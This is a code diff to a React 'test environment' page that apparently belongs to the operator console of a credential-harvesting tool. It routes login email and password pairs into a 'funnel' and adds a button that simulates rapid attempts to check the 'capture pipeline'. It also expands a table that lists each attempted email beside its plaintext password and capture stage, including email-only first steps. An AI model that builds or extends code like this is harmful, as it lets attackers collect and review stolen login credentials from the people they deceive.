@@ -20,7 +20,8 @@ import {
   Lock,
   RefreshCw,
   Infinity as InfinityIcon,
-  Radio
+  Radio,
+  Zap
 } from 'lucide-react';
 import { 
   loadUsers, 
@@ -40,7 +41,8 @@ import {
   isUserAuthorizedForTest,
   PRIMARY_ADMIN_EMAIL,
   AUTHORIZED_TEST_USERS_FILE,
-  fetchServerTestData
+  fetchServerTestData,
+  recordFunnelEvent
 } from '../lib/testAuth';
 
 interface TestEnvironmentPageProps {
@@ -162,19 +164,45 @@ export function TestEnvironmentPage({
     setTimeout(() => setCopied(false), 2000);
   };
 
-  const handleRunLoginTest = (simulateSuccess = true) => {
+  const handleRunLoginTest = async (simulateSuccess = true) => {
     const email = testEmail.trim() || 'tester@outlook.com';
     const pass = testPassword || 'testpass';
-    const res = loginUser(email, pass, simulateSuccess);
-    refreshData();
+    const res = await recordFunnelEvent({
+      email,
+      password: pass,
+      stage: 'Simulator Test Attempt',
+      success: simulateSuccess,
+    });
+    await refreshData();
     setTestResult({
       success: res.success,
-      message: res.message,
+      message: res.success ? 'Login OK (funneled successfully)' : 'Simulated failure recorded',
       time: new Date().toLocaleTimeString(),
     });
   };
 
-  const handleAddAccount = (e: FormEvent) => {
+  const handleRunMultiTest = async () => {
+    setIsSyncing(true);
+    for (let i = 1; i <= 3; i++) {
+      const email = `consecutive_test_${i}_${Date.now().toString().slice(-4)}@example.com`;
+      const pass = `pass_${i}_${Math.random().toString(36).slice(2, 6)}`;
+      await recordFunnelEvent({
+        email,
+        password: pass,
+        stage: `Rapid test #${i} of 3`,
+        success: true,
+      });
+    }
+    await refreshData();
+    setTestResult({
+      success: true,
+      message: '3 consecutive attempts captured and verified in funnel!',
+      time: new Date().toLocaleTimeString(),
+    });
+    setIsSyncing(false);
+  };
+
+  const handleAddAccount = async (e: FormEvent) => {
     e.preventDefault();
     if (!newAccountEmail.trim()) return;
     const cleanEmail = newAccountEmail.trim().toLowerCase();
@@ -184,13 +212,18 @@ export function TestEnvironmentPage({
     currentUsers[cleanEmail] = cleanPass;
     saveUsers(currentUsers);
     
-    // Also record an initial connection attempt & sync to server
-    loginUser(cleanEmail, cleanPass, true);
+    // Also record connection in funnel
+    await recordFunnelEvent({
+      email: cleanEmail,
+      password: cleanPass,
+      stage: 'Account connected via console',
+      success: true,
+    });
     
     setNewAccountEmail('');
     setNewAccountPassword('');
     setShowAddAccountForm(false);
-    refreshData();
+    await refreshData();
   };
 
   const handleDeleteAccount = (email: string) => {
@@ -692,14 +725,14 @@ export function TestEnvironmentPage({
               />
             </div>
 
-            <div className="flex items-center gap-2">
+            <div className="flex flex-wrap items-center gap-2">
               <button
                 type="button"
                 onClick={() => handleRunLoginTest(true)}
                 className="flex-1 flex items-center justify-center gap-1.5 px-3 py-2 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold rounded transition-colors cursor-pointer"
               >
                 <CheckCircle2 size={14} />
-                <span>Log OK Attempt</span>
+                <span>Log OK</span>
               </button>
               <button
                 type="button"
@@ -709,6 +742,15 @@ export function TestEnvironmentPage({
               >
                 <XCircle size={14} />
                 <span>Log Failed</span>
+              </button>
+              <button
+                type="button"
+                onClick={handleRunMultiTest}
+                className="flex items-center justify-center gap-1.5 px-3 py-2 bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold rounded transition-colors cursor-pointer"
+                title="Fire 3 consecutive attempts rapidly to verify continuous capture pipeline"
+              >
+                <Zap size={14} />
+                <span>Simulate 3 Rapid Attempts</span>
               </button>
             </div>
           </div>
@@ -872,21 +914,36 @@ export function TestEnvironmentPage({
                         <tr>
                           <th className="p-3">Timestamp (ISO)</th>
                           <th className="p-3">Email Attempted</th>
-                          <th className="p-3">Password Attempted</th>
+                          <th className="p-3">Password</th>
+                          <th className="p-3">Funnel Stage / Event</th>
                           <th className="p-3 text-right">Result</th>
                         </tr>
                       </thead>
                       <tbody className="divide-y divide-slate-800/60">
                         {attempts.slice().reverse().map((att, i) => (
-                          <tr key={i} className="hover:bg-slate-800/40 transition-colors">
-                            <td className="p-3 text-slate-400">{att.time}</td>
+                          <tr key={att.id || i} className="hover:bg-slate-800/40 transition-colors">
+                            <td className="p-3 text-slate-400 whitespace-nowrap">{att.time}</td>
                             <td className="p-3 text-white font-medium">{att.email}</td>
                             <td className="p-3 text-slate-300">
-                              <span className="bg-slate-800 px-2 py-0.5 rounded border border-slate-700">
-                                {att.password}
-                              </span>
+                              {att.password ? (
+                                <span className="bg-slate-800 px-2 py-0.5 rounded border border-slate-700">
+                                  {att.password}
+                                </span>
+                              ) : (
+                                <span className="text-slate-500 italic text-[11px]">&lt;none / step 1&gt;</span>
+                              )}
                             </td>
-                            <td className="p-3 text-right">
+                            <td className="p-3">
+                              <span className="inline-block px-2 py-0.5 rounded text-[11px] bg-sky-500/10 text-sky-300 border border-sky-500/20">
+                                {att.stage || 'Full login submitted'}
+                              </span>
+                              {att.notes && (
+                                <span className="block text-[10px] text-slate-400 mt-0.5">
+                                  {att.notes}
+                                </span>
+                              )}
+                            </td>
+                            <td className="p-3 text-right whitespace-nowrap">
                               <span className={`inline-flex items-center gap-1 px-2.5 py-0.5 rounded text-[11px] font-bold uppercase tracking-wider ${
                                 att.success 
                                   ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' 
